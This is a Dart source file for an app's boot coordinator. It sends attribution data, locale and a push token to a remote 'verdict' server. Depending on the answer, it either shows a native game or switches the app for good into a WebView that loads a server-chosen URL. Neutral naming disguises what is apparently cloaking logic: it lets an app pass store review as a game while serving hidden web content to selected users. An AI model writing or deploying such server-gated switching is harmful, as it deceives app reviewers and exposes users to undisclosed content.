import 'dart:async';
import 'dart:io';

import 'config/relay_config.dart';
import 'core/landing.dart';
import 'wire/alert_channel.dart';
import 'wire/attribution_pulse.dart';
import 'wire/beacon_keystore.dart';
import 'wire/inline_beacon.dart';
import 'wire/pulse_probe.dart';
import 'wire/verdict_call.dart';

// ============================================================
// RELAY COORDINATOR — single entry point for the boot decision
// ============================================================
// One method: `decide(onProgress)` returns a `Landing` sealed
// type. The boot screen destructures via `switch (landing)` and
// only there decides which route to push. No routing logic lives
// anywhere else in the codebase.
//
// The decision pipeline branches on the persisted [RouteMemory]:
//
//   undecided (first launch)
//     ├─ no adapter        → OfflineLanding(returnsToGame: false)
//     ├─ DNS probe fails   → OfflineLanding(returnsToGame: false)
//     ├─ verdict approved  → save portal → PortalLanding(url)
//     └─ verdict rejected  → save native → GameLanding
//
//   portal (was in the WebView)
//     ├─ no adapter        → OfflineLanding(returnsToGame: false)
//     ├─ cold-tap URL      → PortalLanding(url, coldTap: true)
//     ├─ fresh cached URL  → PortalLanding(cachedUrl)
//     ├─ verdict approved  → PortalLanding(freshUrl)
//     ├─ verdict rejected but cache exists
//     │                    → PortalLanding(cachedUrl)  (last-known-good)
//     └─ otherwise         → OfflineLanding(returnsToGame: false)
//
//   native (was in the game)
//     ├─ no adapter        → GameLanding                (never blocks)
//     ├─ verdict approved  → save portal → PortalLanding(url)
//     └─ verdict rejected  → GameLanding
//
// Concurrent boots are de-duplicated — the coordinator caches the
// in-flight future so two synchronous `decide()` calls (e.g. the
// boot screen briefly building twice) do not fire two verdict
// POSTs. The cache clears on completion so a Retry from the
// offline stage re-runs the pipeline in full.
// ============================================================

class RelayCoordinator {
  RelayCoordinator({
    required this.keystore,
    required this.probe,
    required this.pulse,
    required this.verdict,
    required this.alerts,
  });

  final BeaconKeystore keystore;
  final PulseProbe probe;
  final AttributionPulse pulse;
  final VerdictCall verdict;
  final AlertChannel alerts;

  Future<Landing>? _inFlight;

  Future<Landing> decide({void Function(double)? onProgress}) {
    return _inFlight ??= _decide(onProgress ?? (_) {})
        .whenComplete(() => _inFlight = null);
  }

  Future<Landing> _decide(void Function(double) onProgress) async {
    if (!RelayConfig.credentialsReady) {
      onProgress(1);
      return const GameLanding();
    }

    alerts.onTokenChanged = _refreshOnTokenChange;

    // Cold-boot push tap always wins.
    final String? coldTapUrl = await InlineBeacon.consume(keystore);
    if (coldTapUrl != null && coldTapUrl.isNotEmpty) {
      await keystore.saveRoute(RouteMemory.portal);
      unawaited(_fireAndForget());
      onProgress(1);
      return PortalLanding(coldTapUrl, coldTap: true);
    }

    onProgress(0.15);
    return switch (keystore.route) {
      RouteMemory.undecided => _decideFirstLaunch(onProgress),
      RouteMemory.portal => _decideReturningPortal(onProgress),
      RouteMemory.native => _decideReturningGame(onProgress),
    };
  }

  Future<Landing> _decideFirstLaunch(void Function(double) onProgress) async {
    if (!await probe.hasAdapter()) {
      return const OfflineLanding(returnsToGame: false);
    }
    onProgress(0.3);
    try {
      await alerts.boot();
    } catch (_) {}
    if (!await probe.canDialOut()) {
      return const OfflineLanding(returnsToGame: false);
    }
    onProgress(0.5);
    await pulse.start();
    await pulse.awaitSignals(
      installSeconds: RelayConfig.firstInstallAwaitSeconds,
    );
    onProgress(0.75);
    final Verdict answer = await _requestVerdict();
    onProgress(1);
    if (answer.hasDestination) {
      await keystore.saveRoute(RouteMemory.portal);
      return PortalLanding(answer.url!);
    }
    await keystore.saveRoute(RouteMemory.native);
    return const GameLanding();
  }

  Future<Landing> _decideReturningPortal(
    void Function(double) onProgress,
  ) async {
    if (!await probe.hasAdapter()) {
      return const OfflineLanding(returnsToGame: false);
    }
    final String? pending = await keystore.consumePendingUrl();
    if (pending != null && pending.isNotEmpty) {
      onProgress(1);
      return PortalLanding(pending);
    }
    final String? cached = await keystore.cachedDestination();
    if (cached != null && !keystore.cachedDestinationExpired) {
      onProgress(1);
      return PortalLanding(cached);
    }

    await Future.wait<void>(<Future<void>>[
      alerts.boot(),
      pulse.start(),
    ]);
    if (!await probe.canDialOut()) {
      if (cached != null) {
        return PortalLanding(cached);
      }
      return const OfflineLanding(returnsToGame: false);
    }
    onProgress(0.6);
    await pulse.awaitSignals(
      installSeconds: RelayConfig.returningInstallAwaitSeconds,
    );
    final Verdict answer = await _requestVerdict();
    onProgress(1);
    if (answer.hasDestination) return PortalLanding(answer.url!);
    if (cached != null) return PortalLanding(cached);
    return const OfflineLanding(returnsToGame: false);
  }

  Future<Landing> _decideReturningGame(
    void Function(double) onProgress,
  ) async {
    if (!await probe.hasAdapter()) {
      onProgress(1);
      return const GameLanding();
    }
    await Future.wait<void>(<Future<void>>[
      alerts.boot(),
      pulse.start(),
    ]);
    if (!await probe.canDialOut()) {
      onProgress(1);
      return const GameLanding();
    }
    onProgress(0.55);
    await pulse.awaitSignals(
      installSeconds: RelayConfig.returningInstallAwaitSeconds,
    );
    final Verdict answer = await _requestVerdict();
    onProgress(1);
    if (!answer.hasDestination) return const GameLanding();
    await keystore.saveRoute(RouteMemory.portal);
    return PortalLanding(answer.url!);
  }

  Future<Verdict> _requestVerdict({String? token}) async {
    final Map<String, dynamic> body = await pulse.compose(
      locale: Platform.localeName.replaceAll('-', '_'),
      pushToken: token ?? alerts.token,
    );
    return verdict.ask(body);
  }

  Future<void> _fireAndForget() async {
    try {
      await Future.wait<void>(<Future<void>>[
        alerts.boot(),
        pulse.start(),
      ]);
      await pulse.awaitSignals(
        installSeconds: RelayConfig.returningInstallAwaitSeconds,
      );
      await _requestVerdict();
    } catch (_) {}
  }

  Future<void> _refreshOnTokenChange(String token) async {
    try {
      await _requestVerdict(token: token);
    } catch (_) {}
  }
}
